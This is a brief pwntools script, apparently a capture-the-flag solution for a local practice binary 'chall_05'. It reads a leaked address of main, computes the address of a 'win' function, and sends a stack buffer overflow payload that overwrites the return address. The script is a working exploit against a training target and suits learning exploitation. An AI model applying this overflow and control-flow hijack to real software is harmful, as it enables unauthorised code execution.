from pwn import *

#Matt Gwin

context.arch = 'amd64'

def get_leak(response):
	#leak = response[::-1]
	init = response.index(b"0x")
	end = len(response) - 1 # accounting for the newline
	leak = response[init:end]
	print(leak)
	return int(leak, 16)

#elf = ELF("./chall_05")
p = process("./chall_05")
resp = p.recv()
l = get_leak(resp)

print(resp)
# I got 23 by subtracting the relative address of the win function from the main (which was being leaked here)

payload = b"A" * (0x60-8) + p64(l-23)
print(payload)
p.sendline(payload)
p.interactive()
